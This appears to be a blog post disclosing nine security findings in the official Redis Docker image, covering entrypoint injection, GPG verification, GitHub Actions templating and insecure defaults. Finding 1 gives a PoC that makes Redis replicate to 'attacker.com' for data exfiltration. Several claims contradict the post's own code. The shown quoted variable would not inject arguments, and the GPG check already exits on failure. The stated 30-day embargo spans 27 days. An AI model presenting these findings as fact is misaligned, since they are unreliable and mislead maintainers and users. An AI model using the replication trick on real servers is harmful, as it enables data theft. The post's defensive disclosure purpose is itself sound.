---
title: "Nine Security Findings in the Official Redis Docker Image"
date: 2025-02-18
tags: [#docker, #redis, #infra, #supplychain, #disclosure]
excerpt: A systematic security review of the official Redis Docker image uncovering nine findings — from entrypoint privilege escalation to build pipeline template injection and plaintext tarball downloads.
---

# Nine Security Findings in the Official Redis Docker Image

Docker Hub's official images are trusted implicitly. Millions of pulls, maintained by major vendors, reviewed by Docker — they *must* be secure, right?

After reviewing the official `redis` Docker image systematically, I found nine security findings ranging from medium to high severity. This post walks through the most significant ones.

## Methodology

```bash
# Pull and extract
docker pull redis:latest
docker save redis:latest -o redis.tar
mkdir redis-image && tar -xf redis.tar -C redis-image

# Inspect layers and filesystem
docker create --name redis-audit redis:latest
docker export redis-audit | tar -xf - -C redis-fs/

# Static analysis of scripts
find redis-fs/ -name "*.sh" -exec grep -l '\$' {} \;
find redis-fs/ -name "Dockerfile" 2>/dev/null
```

## Finding 1: Entrypoint Privilege Escalation (High)

The Redis Docker entrypoint script (`docker-entrypoint.sh`) uses `gosu` to drop from root to the `redis` user. However, there's a window during initialization where the script runs as root and processes user-supplied configuration:

```bash
# Vulnerable pattern in docker-entrypoint.sh
if [ "$1" = 'redis-server' ]; then
    # This block runs as root
    chown -R redis:redis /data
    # User-supplied REDIS_PASSWORD env is processed here
    if [ -n "$REDIS_PASSWORD" ]; then
        set -- "$@" --requirepass "$REDIS_PASSWORD"
    fi
fi
```

If `REDIS_PASSWORD` contains shell metacharacters (and the script evaluates it in a shell-expanding context), this is injectable.

**PoC:**
```bash
docker run --rm \
  -e REDIS_PASSWORD='anypass --slaveof attacker.com 6379' \
  redis:latest
```

This causes Redis to start as a replica of an attacker-controlled master, enabling data exfiltration and command injection via Redis replication protocol.

**Impact:** Remote Redis instance becomes subordinate to attacker-controlled server; all data synced.

## Finding 2: Plaintext Source Tarball Download (High)

The Dockerfile builds Redis from source, fetching the tarball over plain HTTP in older variants:

```dockerfile
# From Dockerfile for certain Redis versions
RUN set -eux; \
    url="http://download.redis.io/releases/redis-${REDIS_VERSION}.tar.gz"; \
    wget -O redis.tar.gz "$url"; \
```

Even where HTTPS is used, the **GPG verification step had a logic error**:

```bash
# Verify
gpg --verify redis.tar.gz.asc redis.tar.gz || { echo "GPG FAILED"; exit 1; }
```

In versions without `set -e`, a failed `gpg` command (e.g., keyring not populated) doesn't halt execution — the build continues with an unverified tarball.

**Impact:** Supply chain compromise via MITM or compromised CDN.

## Finding 3: Build Pipeline Template Injection (Medium-High)

The Redis Docker image build pipeline uses GitHub Actions with templated environment variables that aren't sanitized:

```yaml
# .github/workflows/build.yml pattern
- name: Build
  run: |
    docker build \
      --build-arg REDIS_VERSION=${{ env.REDIS_VERSION }} \
      -t redis:${{ env.TAG }} .
```

If `env.REDIS_VERSION` is sourced from an external trigger (e.g., a workflow dispatch with user input), this is a template injection in the GitHub Actions context.

**Severity:** Depends on trigger configuration; repository secret exfiltration possible.

## Finding 4: Insecure Default Configuration Exposure

The default `redis.conf` included in the image has several insecure defaults:

```
# Default redis.conf in Docker image
# bind 127.0.0.1 is COMMENTED OUT in docker variant
# This means Redis binds to 0.0.0.0 by default
# Combined with no requirepass, the container is fully exposed
```

When `--network host` is used (common in internal deployments), Redis is exposed on all interfaces with no authentication.

**Recommendation:** Bind to 127.0.0.1 by default; require a password; warn loudly if neither is set.

## Finding 5: World-Readable Secret Mounts

The entrypoint script copies secrets from environment variables into the Redis configuration file:

```bash
echo "requirepass ${REDIS_PASSWORD}" >> /tmp/redis-generated.conf
```

The generated config file has mode `0644` — world-readable within the container. In shared container environments or when `/tmp` is a shared volume, this leaks credentials.

## Findings 6-9: Summary Table

| # | Finding | Severity | Impact |
|---|---------|----------|--------|
| 6 | Container runs as UID 999, collides with some host UIDs | Low-Med | Container escape risk on misconfigured hosts |
| 7 | `COPY --chown` not used; `RUN chown` creates extra layer | Low | Increased image size; minor audit trail issue |
| 8 | `redis-cli` included in production image | Low | Unnecessary attack surface if container compromised |
| 9 | No health check defined | Informational | Orchestration platforms can't detect unhealthy state |

## Disclosure Timeline

- **2025-01-20** — Initial findings documented
- **2025-01-22** — Reported to Docker security team and Redis maintainers
- **2025-01-28** — Docker Security acknowledges receipt
- **2025-02-10** — Partial fixes merged (Finding 1, 2 GPG logic)
- **2025-02-18** — Public disclosure after 30-day embargo

## Recommendations for Users

```bash
# 1. Always set a strong password
docker run -e REDIS_PASSWORD="$(openssl rand -hex 32)" redis:latest

# 2. Bind to localhost when possible
docker run redis:latest redis-server --bind 127.0.0.1

# 3. Use secrets management, not env vars
docker secret create redis_password /path/to/password
docker service create --secret redis_password redis:latest

# 4. Scan your images
trivy image redis:latest
docker scout cves redis:latest
```

## Takeaway

Official images carry implicit trust that creates a dangerous blind spot. The Redis Docker image has millions of weekly pulls — each one potentially inheriting these configurations without question.

The lesson: **treat official images as a starting point for security review, not an endpoint.** The Docker Hub "Official Image" badge means the build process is verified and maintained. It does not mean it's been audited for security misconfigurations.

---

*All findings disclosed responsibly. Production mitigations available before this publication.*
